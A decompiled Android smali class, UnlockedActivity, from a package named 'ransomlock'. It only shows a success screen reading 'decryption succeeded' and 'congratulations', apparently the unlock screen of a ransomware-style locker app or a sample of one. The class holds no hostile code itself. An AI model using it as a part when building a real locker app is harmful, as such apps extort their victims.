.class public Lcom/kithub/ransomlock/UnlockedActivity;
.super Landroid/app/Activity;
.source "UnlockedActivity.java"


# static fields
.field private static final SUCCESS_BODY:Ljava/lang/String; = "\u304a\u3081\u3067\u3068\u3046"

.field private static final SUCCESS_TITLE:Ljava/lang/String; = "\u5fa9\u53f7\u6210\u529f"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 7
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 14
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 15
    sget v0, Lcom/kithub/ransomlock/R$layout;->activity_unlocked:I

    invoke-virtual {p0, v0}, Lcom/kithub/ransomlock/UnlockedActivity;->setContentView(I)V

    .line 17
    sget v0, Lcom/kithub/ransomlock/R$id;->success_title:I

    invoke-virtual {p0, v0}, Lcom/kithub/ransomlock/UnlockedActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    .line 18
    .local v0, "title":Landroid/widget/TextView;
    sget v1, Lcom/kithub/ransomlock/R$id;->success_body:I

    invoke-virtual {p0, v1}, Lcom/kithub/ransomlock/UnlockedActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    .line 20
    .local v1, "body":Landroid/widget/TextView;
    const-string v2, "\u5fa9\u53f7\u6210\u529f"

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_0

    invoke-virtual {v0, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 21
    :cond_0
    const-string v2, "\u304a\u3081\u3067\u3068\u3046"

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_1

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 22
    :cond_1
    return-void
.end method
